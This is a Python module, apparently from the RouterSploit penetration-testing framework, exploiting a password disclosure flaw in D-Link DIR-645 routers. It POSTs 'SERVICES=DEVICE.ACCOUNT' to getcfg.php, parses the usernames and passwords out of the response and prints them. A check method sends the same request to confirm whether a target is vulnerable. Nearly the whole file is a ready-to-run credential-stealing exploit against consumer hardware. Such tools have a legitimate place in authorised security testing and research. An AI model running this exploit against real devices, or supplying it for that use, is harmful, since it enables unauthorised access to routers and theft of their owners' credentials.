import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DIR-645 Password Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials."
    """
    __info__ = {
        'name': 'D-Link DIR-645 Password Disclosure',
        'description': 'Module exploits D-Link DIR-645 password disclosure vulnerability.',
        'authors': [
            'Roberto Paleari <roberto[at]greyhats.it>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt'
        ],
        'devices': [
            'D-Link DIR-645 (Versions < 1.03)',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port

    def run(self):
        # address and parameters
        url = "{}:{}/getcfg.php".format(self.target, self.port)
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        # connection
        response = http_request(method="POST", url=url, data=data)
        if response is None:
            return

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub('\s+', '', response.text))

        # displaying results
        if len(creds):
            print_success("Credentials found!")
            headers = ('Username', 'Password')
            creds = tuple(tuple([item[0], item[2]]) for item in creds)
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        # address and parameters
        url = "{}:{}/getcfg.php".format(self.target, self.port)
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        response = http_request(method="POST", url=url, data=data)
        if response is None:
            return False  # target is not vulnerable

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub('\s+', '', response.text))

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
